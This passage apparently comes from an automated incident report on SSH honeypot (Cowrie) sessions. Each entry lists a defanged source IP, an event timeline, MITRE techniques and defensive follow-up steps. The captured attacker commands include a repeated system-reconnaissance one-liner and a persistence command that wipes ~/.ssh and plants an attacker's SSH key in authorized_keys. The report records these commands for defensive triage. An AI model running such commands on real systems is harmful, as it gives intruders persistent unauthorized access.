| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:26:54` | `cowrie.session.connect` |
| `2026-07-11 11:26:54` | `cowrie.client.version` |
| `2026-07-11 11:26:54` | `cowrie.client.kex` |
| `2026-07-11 11:26:55` | `cowrie.login.success` |
| `2026-07-11 11:26:56` | `cowrie.session.params` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.success` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:56` | `cowrie.command.input` |
| `2026-07-11 11:26:57` | `cowrie.log.closed` |
| `2026-07-11 11:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e702ec6fb995

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 11:28 |
| **Last Seen** | 2026-07-11 11:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:28:28` | `cowrie.session.connect` |
| `2026-07-11 11:28:28` | `cowrie.client.version` |
| `2026-07-11 11:28:28` | `cowrie.client.kex` |
| `2026-07-11 11:28:29` | `cowrie.login.success` |
| `2026-07-11 11:28:30` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:28:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:28:30` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b7a2dc8af8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:28 |
| **Last Seen** | 2026-07-11 11:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:28:40` | `cowrie.session.connect` |
| `2026-07-11 11:28:40` | `cowrie.client.version` |
| `2026-07-11 11:28:40` | `cowrie.client.kex` |
| `2026-07-11 11:28:41` | `cowrie.login.success` |
| `2026-07-11 11:28:42` | `cowrie.session.params` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.success` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:42` | `cowrie.command.input` |
| `2026-07-11 11:28:43` | `cowrie.log.closed` |
| `2026-07-11 11:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93da4619039f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:30 |
| **Last Seen** | 2026-07-11 11:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:30:19` | `cowrie.session.connect` |
| `2026-07-11 11:30:19` | `cowrie.client.version` |
| `2026-07-11 11:30:19` | `cowrie.client.kex` |
| `2026-07-11 11:30:20` | `cowrie.login.success` |
| `2026-07-11 11:30:21` | `cowrie.session.params` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.success` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.command.input` |
| `2026-07-11 11:30:21` | `cowrie.log.closed` |
| `2026-07-11 11:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4d9d05a374

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]229` |
| **First Seen** | 2026-07-11 11:30 |
| **Last Seen** | 2026-07-11 11:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:30:23` | `cowrie.session.connect` |
| `2026-07-11 11:30:23` | `cowrie.client.version` |
| `2026-07-11 11:30:23` | `cowrie.client.kex` |
| `2026-07-11 11:30:27` | `cowrie.login.success` |
| `2026-07-11 11:30:29` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:30:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:30:32` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]229` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6f02a860ea2

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-11 11:31 |
| **Last Seen** | 2026-07-11 11:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:31:49` | `cowrie.session.connect` |
| `2026-07-11 11:31:50` | `cowrie.client.version` |
| `2026-07-11 11:31:50` | `cowrie.client.kex` |
| `2026-07-11 11:31:52` | `cowrie.login.success` |
| `2026-07-11 11:31:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2856a013036

| Field | Detail |
|---|---|
| **Source IP** | `116.228.233[.]93` |
| **First Seen** | 2026-07-11 11:31 |
| **Last Seen** | 2026-07-11 11:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:31:56` | `cowrie.session.connect` |
| `2026-07-11 11:31:56` | `cowrie.client.version` |
| `2026-07-11 11:31:56` | `cowrie.client.kex` |
| `2026-07-11 11:31:57` | `cowrie.login.success` |
| `2026-07-11 11:31:58` | `cowrie.session.params` |
| `2026-07-11 11:31:58` | `cowrie.command.input` |
| `2026-07-11 11:31:58` | `cowrie.command.failed` |
| `2026-07-11 11:31:58` | `cowrie.log.closed` |
| `2026-07-11 11:31:59` | `cowrie.session.params` |
| `2026-07-11 11:31:59` | `cowrie.command.input` |
| `2026-07-11 11:31:59` | `cowrie.session.file_download` |
| `2026-07-11 11:31:59` | `cowrie.log.closed` |
| `2026-07-11 11:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.233[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.228.233[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50ffb3ca53f

| Field | Detail |
|---|---|
| **Source IP** | `213.101.138[.]172` |
| **First Seen** | 2026-07-11 11:31 |
| **Last Seen** | 2026-07-11 11:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:31:59` | `cowrie.session.connect` |
| `2026-07-11 11:32:00` | `cowrie.client.version` |
| `2026-07-11 11:32:00` | `cowrie.client.kex` |
| `2026-07-11 11:32:02` | `cowrie.login.success` |
| `2026-07-11 11:32:02` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.101.138[.]172` to AbuseIPDB if not already reported
- [ ] Block `213.101.138[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc292314be33

| Field | Detail |
|---|---|
| **Source IP** | `116.228.233[.]93` |
| **First Seen** | 2026-07-11 11:31 |
| **Last Seen** | 2026-07-11 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:31:59` | `cowrie.session.connect` |
| `2026-07-11 11:32:00` | `cowrie.client.version` |
| `2026-07-11 11:32:00` | `cowrie.client.kex` |
| `2026-07-11 11:32:01` | `cowrie.login.success` |
| `2026-07-11 11:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.233[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.228.233[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2634fa73b65

| Field | Detail |
|---|---|
| **Source IP** | `116.228.233[.]93` |
| **First Seen** | 2026-07-11 11:32 |
| **Last Seen** | 2026-07-11 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:32:01` | `cowrie.session.connect` |
| `2026-07-11 11:32:01` | `cowrie.client.version` |
| `2026-07-11 11:32:01` | `cowrie.client.kex` |
| `2026-07-11 11:32:02` | `cowrie.login.success` |
| `2026-07-11 11:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.233[.]93` to AbuseIPDB if not already reported
- [ ] Block `116.228.233[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296d7e5d6ffb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:32 |
| **Last Seen** | 2026-07-11 11:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:32:01` | `cowrie.session.connect` |
| `2026-07-11 11:32:01` | `cowrie.client.version` |
| `2026-07-11 11:32:01` | `cowrie.client.kex` |
| `2026-07-11 11:32:02` | `cowrie.login.success` |
| `2026-07-11 11:32:03` | `cowrie.session.params` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.success` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:03` | `cowrie.command.input` |
| `2026-07-11 11:32:04` | `cowrie.log.closed` |
| `2026-07-11 11:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bd49cdd2265

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]229` |
| **First Seen** | 2026-07-11 11:33 |
| **Last Seen** | 2026-07-11 11:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:33:02` | `cowrie.session.connect` |
| `2026-07-11 11:33:02` | `cowrie.client.version` |
| `2026-07-11 11:33:02` | `cowrie.client.kex` |
| `2026-07-11 11:33:04` | `cowrie.login.success` |
| `2026-07-11 11:33:04` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:33:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:33:05` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]229` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93360d9dbc1a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 11:33 |
| **Last Seen** | 2026-07-11 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:33:02` | `cowrie.session.connect` |
| `2026-07-11 11:33:02` | `cowrie.client.version` |
| `2026-07-11 11:33:02` | `cowrie.client.kex` |
| `2026-07-11 11:33:03` | `cowrie.login.success` |
| `2026-07-11 11:33:04` | `cowrie.session.params` |
| `2026-07-11 11:33:04` | `cowrie.command.input` |
| `2026-07-11 11:33:04` | `cowrie.log.closed` |
| `2026-07-11 11:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6272c2610ca4

| Field | Detail |
|---|---|
| **Source IP** | `115.95.23[.]226` |
| **First Seen** | 2026-07-11 11:33 |
| **Last Seen** | 2026-07-11 11:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:33:21` | `cowrie.session.connect` |
| `2026-07-11 11:33:21` | `cowrie.client.version` |
| `2026-07-11 11:33:21` | `cowrie.client.kex` |
| `2026-07-11 11:33:24` | `cowrie.login.success` |
| `2026-07-11 11:33:25` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.95.23[.]226` to AbuseIPDB if not already reported
- [ ] Block `115.95.23[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c4a9f2eb3e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:33 |
| **Last Seen** | 2026-07-11 11:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:33:47` | `cowrie.session.connect` |
| `2026-07-11 11:33:47` | `cowrie.client.version` |
| `2026-07-11 11:33:47` | `cowrie.client.kex` |
| `2026-07-11 11:33:48` | `cowrie.login.success` |
| `2026-07-11 11:33:49` | `cowrie.session.params` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.success` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.command.input` |
| `2026-07-11 11:33:49` | `cowrie.log.closed` |
| `2026-07-11 11:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab4142851d8

| Field | Detail |
|---|---|
| **Source IP** | `216.226.77[.]20` |
| **First Seen** | 2026-07-11 11:34 |
| **Last Seen** | 2026-07-11 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:34:22` | `cowrie.session.connect` |
| `2026-07-11 11:34:22` | `cowrie.login.success` |
| `2026-07-11 11:34:23` | `cowrie.session.params` |
| `2026-07-11 11:34:23` | `cowrie.command.input` |
| `2026-07-11 11:34:23` | `cowrie.command.input` |
| `2026-07-11 11:34:23` | `cowrie.command.failed` |
| `2026-07-11 11:34:23` | `cowrie.command.input` |
| `2026-07-11 11:34:23` | `cowrie.command.failed` |
| `2026-07-11 11:34:23` | `cowrie.command.input` |
| `2026-07-11 11:34:23` | `cowrie.log.closed` |
| `2026-07-11 11:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.226.77[.]20` to AbuseIPDB if not already reported
- [ ] Block `216.226.77[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f878f33059

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]251` |
| **First Seen** | 2026-07-11 11:35 |
| **Last Seen** | 2026-07-11 11:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:35:06` | `cowrie.session.connect` |
| `2026-07-11 11:35:07` | `cowrie.client.version` |
| `2026-07-11 11:35:07` | `cowrie.client.kex` |
| `2026-07-11 11:35:10` | `cowrie.login.success` |
| `2026-07-11 11:35:11` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]251` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91d8d99df967

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:35 |
| **Last Seen** | 2026-07-11 11:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:35:31` | `cowrie.session.connect` |
| `2026-07-11 11:35:31` | `cowrie.client.version` |
| `2026-07-11 11:35:31` | `cowrie.client.kex` |
| `2026-07-11 11:35:32` | `cowrie.login.success` |
| `2026-07-11 11:35:33` | `cowrie.session.params` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.command.success` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.command.input` |
